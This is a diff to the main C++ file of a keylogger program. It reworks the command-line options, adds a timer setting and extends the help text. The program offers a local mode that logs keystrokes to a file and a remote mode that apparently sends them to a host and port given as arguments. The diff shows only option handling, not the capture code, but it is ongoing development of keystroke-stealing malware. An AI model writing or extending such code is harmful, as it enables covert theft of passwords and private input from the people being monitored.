@@ -2,7 +2,7 @@
 
 keylogger* g_keylogger = nullptr;
 
-size_t g_buffer_size;
+size_t g_buffer_size = DEFAULT_VALUE_BUFFER_SIZE;
 
 bool g_no_arrow;
 
@@ -11,6 +11,8 @@ bool g_no_click;
 bool g_alphabet_only;
 
 bool g_store_character;
+
+int g_timer = DEFAULT_VALUE_TIMER;
 
 BOOL exit_program()
 {
@@ -60,12 +62,12 @@ void initialize_options(int p_arguments_number, char** p_arguments_value)
 				if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_LOCAL)
 				    == 0)
 				{
-					g_keylogger = new keylogger_local(g_buffer_size, optarg);
+					g_keylogger = new keylogger_local(optarg);
 				}
 				else if (strcasecmp(t_long_options[t_option_index].name,
 					LONG_OPTION_REMOTE) == 0)
 				{
-						g_keylogger = new keylogger_remote(g_buffer_size, p_arguments_value[t_option_index + 1], atoi(p_arguments_value[t_option_index + 2]));
+						g_keylogger = new keylogger_remote(p_arguments_value[t_option_index + 1], atoi(p_arguments_value[t_option_index + 2]));
 				}
 				else if (strcasecmp(t_long_options[t_option_index].name,
 					LONG_OPTION_HELP) == 0)
@@ -97,11 +99,11 @@ void initialize_options(int p_arguments_number, char** p_arguments_value)
 			break;
 
 			case SHORT_OPTION_LOCAL:
-				g_keylogger = new keylogger_local(g_buffer_size, optarg);
+				g_keylogger = new keylogger_local(optarg);
 			break;
 
 			case SHORT_OPTION_REMOTE:
-				g_keylogger = new keylogger_remote(g_buffer_size, p_arguments_value[t_option_index + 1], atoi(p_arguments_value[t_option_index + 2]));
+				g_keylogger = new keylogger_remote(p_arguments_value[t_option_index + 1], atoi(p_arguments_value[t_option_index + 2]));
 			break;
 
 			case SHORT_OPTION_BUFFER_SIZE:
@@ -118,6 +120,10 @@ void initialize_options(int p_arguments_number, char** p_arguments_value)
 
 			case SHORT_OPTION_STORE_CHARACTER:
 				g_store_character = true;
+			break;
+
+			case SHORT_OPTION_TIMER:
+				g_timer = atoi(optarg);
 			break;
 
 			case SHORT_OPTION_HELP:
@@ -146,6 +152,9 @@ void print_help()
 	cout << endl;
 	cout << HELP_MESSAGE_OPTIONAL << endl;
 	cout << endl;
+	cout << HELP_MESSAGE_BUFFER_SIZE << endl;
+	cout << HELP_MESSAGE_BUFFER_SIZE_EXAMPLE << endl;
+	cout << endl;
 	cout << HELP_MESSAGE_NO_CLICK << endl;
 	cout << HELP_MESSAGE_NO_CLICK_EXAMPLE << endl;
 	cout << endl;
@@ -154,6 +163,9 @@ void print_help()
 	cout << endl;
 	cout << HELP_MESSAGE_STORE_CHARACTER << endl;
 	cout << HELP_MESSAGE_STORE_CHARACTER_EXAMPLE << endl;
+	cout << endl;
+	cout << HELP_MESSAGE_TIMER << endl;
+	cout << HELP_MESSAGE_TIMER_EXAMPLE << endl;
 	cout << endl;
 	cout << HELP_MESSAGE_HELP << endl;
 	cout << HELP_MESSAGE_HELP_EXAMPLE << endl;
